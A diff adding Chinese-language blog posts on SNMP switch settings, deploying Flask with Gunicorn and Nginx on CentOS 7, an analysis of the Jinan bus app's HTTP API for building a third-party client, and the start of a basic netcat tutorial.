+<p>2.再次执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmp-agent sys-info version all</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个是设置该交换机支持的 SNMP 协议版本，一般有 V1, V2C, V3 这几个版本，最好设置成 all，这样就支持所有版本了，如果不设置这个，某些软件可能无法正常读取信息</p>
+</blockquote>
+<p>3.这样一般就可以了</p>
+]]></content>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CentOS 7 + Python Flask + MySQL + Nginx 配置</title>
+    <url>/2017/04/14/centos-python-flask-nginx/</url>
+    <content><![CDATA[<p>不是很常用，算是给自己留个记录吧<br>部分资料参考自网络</p>
+<p>0.切换到 root 用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>1.安装并启动 Nginx</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br><span class="line">systemctl start nginx.service   <span class="comment"># 开启 nginx 服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> nginx.service   <span class="comment"># 跟随系统启动</span></span><br></pre></td></tr></table></figure>
+
+<p>此时使用 localhost 应该会出现 Welcome to nginx 的欢迎页面了</p>
+<a id="more"></a>
+
+<p>2.安装并启动 MySQL<br>（这里我用的是 MariaDB，就是 MySQL 换个壳，没多大区别…）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install mariadb-server mariadb</span><br><span class="line">systemctl start mariadb   <span class="comment"># 开启 mysql 服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb   <span class="comment"># 跟随系统启动</span></span><br></pre></td></tr></table></figure>
+
+<p>3.初始化 MySQL 安全策略</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
+
+<p>会提示输入 root 密码，默认为空，直接回车即可<br>然后就问是否重新设置 root 密码，当然是要重新设置的啦。设置完后还有几个问题都输入 y 同意就行了</p>
+<p>4.安装并配置 Python 和 pip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install python34 <span class="comment"># 安装 3.4.x 版本</span></span><br></pre></td></tr></table></figure>
+
+<p>由于 CentOS 自带了 Python 2.7 的版本，所以某些情况下，直接替换掉原始的版本可能出现未知问题，比如 yum 没法用之类的，就需要手动去 /usr/bin/python 修改链接关系，使其正确链接到 Python2，可用 ls -l 命令检查，这里我上一张正确的连接图<br><img src="https://ooo.0o0.ooo/2017/02/02/589333313a72c.png" alt><br>后面执行命令的时候我将会用 Python3 来执行，python3 xxx</p>
+<p>5.安装 pip，Gunicorn 和 flask</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install python34-pip <span class="comment"># 安装 pip</span></span><br><span class="line">pip3 install flask</span><br><span class="line">pip3 install gunicorn</span><br></pre></td></tr></table></figure>
+
+<p>6.配置 Flask<br>编写文件 <strong>/home/web/api/api.py</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>7.使用 Gunicorn 启动项目</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gunicorn -D -w 3 -b 127.0.0.1:8000 api:app</span><br><span class="line"></span><br><span class="line">注意要在项目根目录下执行这条命令</span><br><span class="line"></span><br><span class="line">-D 后台运行 </span><br><span class="line">-w 启动 3 个工作线程</span><br><span class="line">-b 指定 IP 和端口号</span><br><span class="line"></span><br><span class="line">最后的那个 api:app</span><br><span class="line">api 就是那个 Python 文件的名称（不包括后缀/模块名）</span><br><span class="line">app 就是 Flask 实例的名称</span><br><span class="line"></span><br><span class="line">可参见上文 api.py 的代码</span><br></pre></td></tr></table></figure>
+
+<p>可以使用 <strong>ps -aux</strong> 命令查看系统运行的进程<br>同样，你也可以使用 <strong>kill [PID]</strong> 来关闭 Gunicorn 的进程</p>
+<p>8.配置 Nginx<br>主要就是配置 nginx 目录，这里我以 api 为例</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/api.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  api.iacn.me; <span class="comment"># 外部域名</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://127.0.0.1:8000; <span class="comment"># 反向代理 Gunicorn 本地的服务地址</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>保存好然后重启 Nginx</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>
+
+<p>9.可以查看一下端口信息<br><img src="https://ooo.0o0.ooo/2017/04/05/58e49752ba86f.png" alt="snipaste20170405_150243.png"></p>
+<p>10.已经可以从外部访问了<br><img src="https://ooo.0o0.ooo/2017/04/05/58e497850d5ff.png" alt="snipaste20170405_150322.png"></p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>泉城公交开发手记（二） API分析</title>
+    <url>/2018/01/16/jinan-bus-note2/</url>
+    <content><![CDATA[<p>本文算是此系列的第一篇，我打算写写济南公交的服务端 API。当下的环境，基本每个应用都会具备联网请求数据的功能，公交客户端这种实时性很强的应用更是如此。既然我们打算做一个第三方客户端，那么第一步就是先要拿到各个车辆的实时数据。下面我会通过抓包来分析原版 369 出行的各个请求，关于抓包过程之前我也写过一篇文章介绍，这里就不多赘述了。</p>
+<p>因为请求众多，这里只针对实际需要用到的数据进行说明，无用的类似请求广告图片什么的就不写了。</p>
+<p>首次打开提示需要登录用户名，这部分其实是无用的。正常的流程会在用户登录时服务端返回一个 Token，后续请求会携带这个 Token。然而 369 出行的这个登录流程完全是无用的，登录的成功与否只是决定能不能进入下一个页面。还有一个值得吐槽的是整个登录流程用户名密码明文传输…</p>
+<a id="more"></a>
+
+<h4 id="0-参数说明"><a href="#0-参数说明" class="headerlink" title="0. 参数说明"></a>0. 参数说明</h4><p>向微步服务器的所有请求都需要在 Header 中加上 <strong>version</strong> 参数，值是版本号，示例<br>version = android-insigma.waybook.jinan-2337，后面不再说明。</p>
+<p>Json 返回的变量名，也是只说明一次的，后面重复的也不会再说明。</p>
+<hr>
+<h4 id="1-首页"><a href="#1-首页" class="headerlink" title="1. 首页"></a>1. 首页</h4><p>GET –&gt; <a href="http://www.iwaybook.com/server-ue2/rest/servers-v2/370100" target="_blank" rel="noopener">http://www.iwaybook.com/server-ue2/rest/servers-v2/370100</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">数据</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">370100</td>
+<td align="center">济南市身份证号六位数字地址码</td>
+</tr>
+</tbody></table>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"status"</span>: &#123;</span><br><span class="line">		<span class="attr">"code"</span>: <span class="number">0</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"result"</span>: &#123;</span><br><span class="line">		<span class="attr">"id"</span>: <span class="number">3</span>,</span><br><span class="line">		<span class="attr">"name"</span>: <span class="string">"370100"</span>,</span><br><span class="line">		<span class="attr">"httpAddr"</span>: <span class="string">"60.216.101.229"</span>,</span><br><span class="line">		<span class="attr">"functions"</span>: <span class="string">"&#123;\"bus\":&#123;\"httpAddr\":\"60.216.101.229\",\"transfertype\":\"1\"&#125;&#125;"</span>,</span><br><span class="line">		<span class="attr">"state"</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">"useToken"</span>: <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">httpAddr</td>
+<td align="center">下一步请求的服务器地址</td>
+</tr>
+</tbody></table>
+<hr>
+<p>GET –&gt; <a href="http://jinan.iwaybook.com/download/update.json" target="_blank" rel="noopener">http://jinan.iwaybook.com/download/update.json</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">数据</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">version</td>
+<td align="center">当前已安装的版本</td>
+</tr>
+</tbody></table>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"status"</span>: &#123;</span><br><span class="line">		<span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"msg"</span>: <span class="string">""</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"result"</span>: &#123;</span><br><span class="line">		<span class="attr">"versionCode"</span>: <span class="number">2337</span>,</span><br><span class="line">		<span class="attr">"versionName"</span>: <span class="string">"3.3.7"</span>,</span><br><span class="line">		<span class="attr">"descriptions"</span>: [<span class="string">"1.增加了“车辆租赁”"</span>],</span><br><span class="line">		<span class="attr">"must"</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="attr">"url"</span>: <span class="string">"http://60.216.101.229/download/jinan.apk"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">versionCode</td>
+<td align="center">最新 versionCode</td>
+</tr>
+<tr>
+<td align="center">versionName</td>
+<td align="center">最新 versionName</td>
+</tr>
+<tr>
+<td align="center">descriptions</td>
+<td align="center">更新日志</td>
+</tr>
+<tr>
+<td align="center">must</td>
+<td align="center">如果为 true，会强制更新，不然无法进入。false 则不会</td>
+</tr>
+<tr>
+<td align="center">url</td>
+<td align="center">最新版本下载链接</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="2-车辆搜索界面"><a href="#2-车辆搜索界面" class="headerlink" title="2. 车辆搜索界面"></a>2. 车辆搜索界面</h4><p>搜索界面的车辆相似查询<br><img src="https://i.loli.net/2018/01/16/5a5dd471d6076.png" alt="device-2018-01-16-154733.png"></p>
+<p>GET –&gt; <a href="http://60.216.101.229/server-ue2/rest/buslines/simple/370100/118/0/20" target="_blank" rel="noopener">http://60.216.101.229/server-ue2/rest/buslines/simple/370100/118/0/20</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">数据</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">60.216.101.229</td>
+<td align="center">上文中请求获取到的 httpAddr，后续也是这个地址</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td align="center">路线编号</td>
+</tr>
+<tr>
+<td align="center">0</td>
+<td align="center">从第几个条目请求</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td align="center">请求多少个条目</td>
+</tr>
+</tbody></table>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"status"</span>: &#123;</span><br><span class="line">		<span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"msg"</span>: <span class="string">""</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"result"</span>: &#123;</span><br><span class="line">		<span class="attr">"pageParam"</span>: &#123;</span><br><span class="line">			<span class="attr">"offset"</span>: <span class="number">0</span>,</span><br><span class="line">			<span class="attr">"len"</span>: <span class="number">20</span>,</span><br><span class="line">			<span class="attr">"totalNum"</span>: <span class="number">2</span></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="attr">"result"</span>: [&#123;</span><br><span class="line">			<span class="attr">"id"</span>: <span class="string">"223"</span>,</span><br><span class="line">			<span class="attr">"lineName"</span>: <span class="string">"118"</span>,</span><br><span class="line">			<span class="attr">"startStationName"</span>: <span class="string">"公交祝甸车场"</span>,</span><br><span class="line">			<span class="attr">"endStationName"</span>: <span class="string">"市立五院"</span>,</span><br><span class="line">			<span class="attr">"updateTime"</span>: <span class="string">"Sep 29, 2017 12:25:11 AM"</span></span><br><span class="line">		&#125;, &#123;</span><br><span class="line">			<span class="attr">"id"</span>: <span class="string">"224"</span>,</span><br><span class="line">			<span class="attr">"lineName"</span>: <span class="string">"118"</span>,</span><br><span class="line">			<span class="attr">"startStationName"</span>: <span class="string">"市立五院"</span>,</span><br><span class="line">			<span class="attr">"endStationName"</span>: <span class="string">"公交祝甸车场"</span>,</span><br><span class="line">			<span class="attr">"updateTime"</span>: <span class="string">"Sep 29, 2017 12:25:31 AM"</span></span><br><span class="line">		&#125;]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">id</td>
+<td align="center">路线ID</td>
+</tr>
+<tr>
+<td align="center">lineName</td>
+<td align="center">路线编号</td>
+</tr>
+<tr>
+<td align="center">startStationName</td>
+<td align="center">始发站</td>
+</tr>
+<tr>
+<td align="center">endStationName</td>
+<td align="center">终点站</td>
+</tr>
+<tr>
+<td align="center">updateTime</td>
+<td align="center">信息更新时间</td>
+</tr>
+</tbody></table>
+<p>这里需要注意同一路车的去程与返程是两个不同的 ID</p>
+<hr>
+<h4 id="3-路线详情界面"><a href="#3-路线详情界面" class="headerlink" title="3. 路线详情界面"></a>3. 路线详情界面</h4><p><img src="https://i.loli.net/2018/01/16/5a5dd472c0322.png" alt="device-2018-01-16-172339.png"></p>
+<p>GET –&gt; <a href="http://60.216.101.229/server-ue2/rest/buslines/370100/223" target="_blank" rel="noopener">http://60.216.101.229/server-ue2/rest/buslines/370100/223</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">数据</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">223</td>
+<td align="center">路线ID</td>
+</tr>
+</tbody></table>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"status"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">""</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"result"</span>: &#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"223"</span>,</span><br><span class="line">    <span class="attr">"area"</span>: <span class="number">370100</span>,</span><br><span class="line">    <span class="attr">"lineName"</span>: <span class="string">"118"</span>,</span><br><span class="line">    <span class="attr">"startStationName"</span>: <span class="string">"公交祝甸车场"</span>,</span><br><span class="line">    <span class="attr">"endStationName"</span>: <span class="string">"市立五院"</span>,</span><br><span class="line">    <span class="attr">"stations"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"area"</span>: <span class="number">370100</span>,</span><br><span class="line">        <span class="attr">"stationName"</span>: <span class="string">"公交祝甸车场"</span>,</span><br><span class="line">        <span class="attr">"lng"</span>: <span class="number">117.09900257524</span>,</span><br><span class="line">        <span class="attr">"lat"</span>: <span class="number">36.703679321059</span>,</span><br><span class="line">        <span class="attr">"buslines"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"state"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="attr">"updateTime"</span>: <span class="string">"Sep 29, 2017 12:25:11 AM"</span>,</span><br><span class="line">        <span class="attr">"distance"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"busLineList"</span>: []</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"area"</span>: <span class="number">370100</span>,</span><br><span class="line">        <span class="attr">"stationName"</span>: <span class="string">"祝甸"</span>,</span><br><span class="line">        <span class="attr">"lng"</span>: <span class="number">117.09818542729</span>,</span><br><span class="line">        <span class="attr">"lat"</span>: <span class="number">36.701505610837</span>,</span><br><span class="line">        <span class="attr">"buslines"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"state"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="attr">"updateTime"</span>: <span class="string">"Sep 29, 2017 12:25:11 AM"</span>,</span><br><span class="line">        <span class="attr">"distance"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"busLineList"</span>: []</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">      ...</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"ticketPrice"</span>: <span class="string">"票价一元"</span>,</span><br><span class="line">    <span class="attr">"operationTime"</span>: <span class="string">"祝甸5:30－00:00  市立五院"</span>,</span><br><span class="line">    <span class="attr">"owner"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"linePoints"</span>: <span class="string">"117.09900257524_36.703679321059,117.09818542729_36.701505610837,117.09402184523_36.701017213509,117.09066994065_36.700634744005..."</span>,</span><br><span class="line">    <span class="attr">"updateTime"</span>: <span class="string">"Sep 29, 2017 12:25:11 AM"</span>,</span><br><span class="line">    <span class="attr">"state"</span>: <span class="string">"0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">stations</td>
+<td align="center">是一个 List。该路线所有站点的信息</td>
+</tr>
+<tr>
+<td align="center">stationName</td>
+<td align="center">站点名</td>
+</tr>
+<tr>
+<td align="center">lng</td>
+<td align="center">经度坐标</td>
+</tr>
+<tr>
+<td align="center">lat</td>
+<td align="center">纬度坐标</td>
+</tr>
+<tr>
+<td align="center">state</td>
+<td align="center">站点状态。0 可用，1 不可用</td>
+</tr>
+<tr>
+<td align="center">ticketPrice</td>
+<td align="center">票价</td>
+</tr>
+<tr>
+<td align="center">linePoints</td>
+<td align="center">所有站点的坐标。以下划线_分隔经度和纬度</td>
+</tr>
+</tbody></table>
+<p>该路线的所有站点会在 stations 中体现，stations 的大小就是该路线所有站点的数量。<br>这里的 lng, lat 经纬度属于百度 BD09 坐标，后面会详细说明。<br>linePoints 是一些字符串，所有站点的坐标。实际没什么用处，因为上文的 stations 中已经包含各个站点的信息了。</p>
+<hr>
+<p>GET –&gt; <a href="http://60.216.101.229/server-ue2/rest/buses/busline/370100/223" target="_blank" rel="noopener">http://60.216.101.229/server-ue2/rest/buses/busline/370100/223</a></p>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"status"</span>: &#123;</span><br><span class="line">		<span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"msg"</span>: <span class="string">""</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"result"</span>: [&#123;</span><br><span class="line">		<span class="attr">"busId"</span>: <span class="string">"4635"</span>,</span><br><span class="line">		<span class="attr">"lng"</span>: <span class="number">116.973701</span>,</span><br><span class="line">		<span class="attr">"lat"</span>: <span class="number">36.66398</span>,</span><br><span class="line">		<span class="attr">"velocity"</span>: <span class="number">22.883572962605573</span>,</span><br><span class="line">		<span class="attr">"isArrvLft"</span>: <span class="string">"2"</span>,</span><br><span class="line">		<span class="attr">"stationSeqNum"</span>: <span class="number">23</span>,</span><br><span class="line">		<span class="attr">"status"</span>: <span class="string">"1"</span>,</span><br><span class="line">		<span class="attr">"buslineId"</span>: <span class="string">"223"</span>,</span><br><span class="line">		<span class="attr">"actTime"</span>: <span class="string">"Jan 16, 2018 03:50:04 PM"</span>,</span><br><span class="line">		<span class="attr">"cardId"</span>: <span class="string">"4635"</span>,</span><br><span class="line">		<span class="attr">"orgName"</span>: <span class="string">""</span>,</span><br><span class="line">		<span class="attr">"averageVelocity"</span>: <span class="number">9.565269318966328</span>,</span><br><span class="line">		<span class="attr">"coordinate"</span>: <span class="number">0</span></span><br><span class="line">	&#125;, &#123;</span><br><span class="line">		<span class="attr">"busId"</span>: <span class="string">"4631"</span>,</span><br><span class="line">		<span class="attr">"lng"</span>: <span class="number">116.957313</span>,</span><br><span class="line">		<span class="attr">"lat"</span>: <span class="number">36.654813</span>,</span><br><span class="line">		<span class="attr">"velocity"</span>: <span class="number">50.211262538794415</span>,</span><br><span class="line">		<span class="attr">"isArrvLft"</span>: <span class="string">"2"</span>,</span><br><span class="line">		<span class="attr">"stationSeqNum"</span>: <span class="number">27</span>,</span><br><span class="line">		<span class="attr">"status"</span>: <span class="string">"1"</span>,</span><br><span class="line">		<span class="attr">"buslineId"</span>: <span class="string">"223"</span>,</span><br><span class="line">		<span class="attr">"actTime"</span>: <span class="string">"Jan 16, 2018 03:49:54 PM"</span>,</span><br><span class="line">		<span class="attr">"cardId"</span>: <span class="string">"4631"</span>,</span><br><span class="line">		<span class="attr">"orgName"</span>: <span class="string">""</span>,</span><br><span class="line">		<span class="attr">"averageVelocity"</span>: <span class="number">9.178488660594233</span>,</span><br><span class="line">		<span class="attr">"coordinate"</span>: <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">busId</td>
+<td align="center">车辆自编号</td>
+</tr>
+<tr>
+<td align="center">stationSeqNum</td>
+<td align="center">即将到达第多少个站</td>
+</tr>
+<tr>
+<td align="center">actTime</td>
+<td align="center">最后活动时间</td>
+</tr>
+<tr>
+<td align="center">cardId</td>
+<td align="center">报站器ID</td>
+</tr>
+<tr>
+<td align="center">averageVelocity</td>
+<td align="center">平均时速</td>
+</tr>
+</tbody></table>
+<p>busId 是该车的自编号，由济南公交公司分配，方便管理<br>stationSeqNum 即将到达第几个站，参见上文的 stations<br>这里的 lng, lat 经纬度属于地球 WGS-84 坐标</p>
+<p>可以看到这里使用的坐标系统和上文中的不同，这里就简略介绍一下这几种坐标的区别。</p>
+<p>WGS-84 坐标系，是国际标准坐标系。从专业 GPS 设备中取出的数据遵循这种坐标，也是国际地图提供商所使用的坐标系。</p>
+<p>GCJ-02 坐标系，也叫国测局坐标系，又称火星坐标。是由中国国家测绘局指定的一种大地坐标系。会对原始坐标进行算法加密，加入随机偏移，隐藏真实位置。理论上不可逆推。国测局规定国内出版的各种地图系统（包括电子形式），必须至少采用 GCJ-02 对地理位置进行首次加密。</p>
+<p>BD-09 坐标系，是百度公司的加密算法坐标系，同样是一种偏移算法。该算法不公开。据传是从 GCJ-02 加密而来，也不一定，也许直接从 WGS-84 转换而来也不得而知</p>
+<p>这三种坐标系的互相转换，网上也有流传方法，但并不完美。</p>
+<hr>
+<h4 id="3-公告界面"><a href="#3-公告界面" class="headerlink" title="3. 公告界面"></a>3. 公告界面</h4><p><img src="https://i.loli.net/2018/01/16/5a5dd472c2733.png" alt="device-2018-01-16-181855.png"></p>
+<p>GET –&gt; <a href="http://60.216.101.229/server-ue2/rest/busAnnouncements/370100/all/0/20" target="_blank" rel="noopener">http://60.216.101.229/server-ue2/rest/busAnnouncements/370100/all/0/20</a></p>
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"status"</span>: &#123;</span><br><span class="line">		<span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"msg"</span>: <span class="string">""</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"result"</span>: &#123;</span><br><span class="line">		<span class="attr">"pageParam"</span>: &#123;</span><br><span class="line">			<span class="attr">"offset"</span>: <span class="number">0</span>,</span><br><span class="line">			<span class="attr">"len"</span>: <span class="number">20</span>,</span><br><span class="line">			<span class="attr">"totalNum"</span>: <span class="number">238</span></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="attr">"result"</span>: [&#123;</span><br><span class="line">			<span class="attr">"id"</span>: <span class="string">"ab9f877a737f42688cd16d73065cd39f"</span>,</span><br><span class="line">			<span class="attr">"area"</span>: <span class="number">370100</span>,</span><br><span class="line">			<span class="attr">"title"</span>: <span class="string">"1月13日起,140路调整部分运行路段"</span>,</span><br><span class="line">			<span class="attr">"content"</span>: <span class="string">"受蓝翔路道路施工影响，1月13日起，140路调整部分运行路段。\n\n140路调整后沿蓝翔中路向东、东宇大街向南、粟山路向东再向南、小清河北路向东恢复原线，新设时代总部基地西门、东宇花园、粟山路东宇大街、东沙王庄、粟山路黄岗路、王炉庄北、粟山路永鼎路站点，将王炉庄站点迁移至粟山路路口东侧，撤销蓝翔中路中段、蓝翔路蓝翔中路、时代总部基地、卢庄工业园、蓝翔路粟山路、北辛庄北、北辛庄站点。"</span>,</span><br><span class="line">			<span class="attr">"publisher"</span>: <span class="string">"济南市公共交通总公司"</span>,</span><br><span class="line">			<span class="attr">"updateTime"</span>: <span class="string">"Jan 11, 2018 03:51:21 PM"</span>,</span><br><span class="line">			<span class="attr">"state"</span>: <span class="string">"1"</span>,</span><br><span class="line">			<span class="attr">"valid"</span>: <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		...</span><br><span class="line">		]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">totalNum</td>
+<td align="center">全部公告数量</td>
+</tr>
+<tr>
+<td align="center">title</td>
+<td align="center">标题</td>
+</tr>
+<tr>
+<td align="center">content</td>
+<td align="center">内容</td>
+</tr>
+<tr>
+<td align="center">publisher</td>
+<td align="center">发布人</td>
+</tr>
+<tr>
+<td align="center">updateTime</td>
+<td align="center">发布时间</td>
+</tr>
+<tr>
+<td align="center">valid</td>
+<td align="center">是否可用</td>
+</tr>
+</tbody></table>
+<hr>
+<p>有了这些必要的信息，已经可以开始做一个第三方的客户端了。下一篇文章，将会详细介绍自定义线路图 View 的实现。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux 下 nc 命令的简单介绍</title>
+    <url>/2017/08/16/linux-netcat/</url>
+    <content><![CDATA[<p>nc 是 Linux 下的一个强大的命令。nc 是简称，全名是 netcat。大部分的 Linux 发行版都有自带 nc 这个命令，如果没有的话就需要自己安装了</p>
+<p>我这里使用的是 CentOS 7.3，对于 nc，你可以使用 yum 安装或者自己编译二进制文件。这里推荐使用 yum 安装，因为 yum 可以自动解决依赖问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nmap-ncat.x86_64</span><br></pre></td></tr></table></figure>
+
+<p>同样，netcat 也有 Windows 版本可用，你可以在 <a href="https://eternallybored.org/misc/netcat" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat</a> 这里下载到 netcat 的 Windows 版本。这里下载到的是一个压缩包，里面包含 netcat 的源代码和 nc &amp; nc64 两个已经编译好的二进制文件，你可以根据自己系统来选择使用 nc 或 nc64</p>
+<a id="more"></a>
+
+<p>成功安装之后你就可以使用 nc 命令了，使用 <strong>nc –help</strong>，你可以查看到 nc 命令的详细帮助。我在这里使用几个具体的例子来简要概述下 nc 命令的基本使用方法</p>
+<h4 id="0-nc-命令的标准使用形式"><a href="#0-nc-命令的标准使用形式" class="headerlink" title="0. nc 命令的标准使用形式"></a>0. nc 命令的标准使用形式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc [-options] ip port[s] [ports]</span><br></pre></td></tr></table></figure>
+
+<p>ip 处是可以使用域名的，nc 会调用 DNS 解析成 IP 地址。如果不需要 nc 自动解析的话可以在执行时添加 <strong>-n [–nodns]</strong> 参数</p>
+<h4 id="1-两台主机之间发送实时消息"><a href="#1-两台主机之间发送实时消息" class="headerlink" title="1. 两台主机之间发送实时消息"></a>1. 两台主机之间发送实时消息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A 主机：nc -lp port</span><br><span class="line">B 主机：nc ip port</span><br></pre></td></tr></table></figure>
+
+<p><strong>-l [–listen]</strong>：绑定并监听传入的连接<br><strong>-p [–source-port]</strong>：指定要使用的源端口</p>
+<p>建立连接后在任意一台主机输入信息并按下回车发送后对方就能收到<br>因为 nc 是会自动从标准流中读取数据的，如果想要禁止，可以在命令执行时使用 <strong>-d</strong> 参数</p>
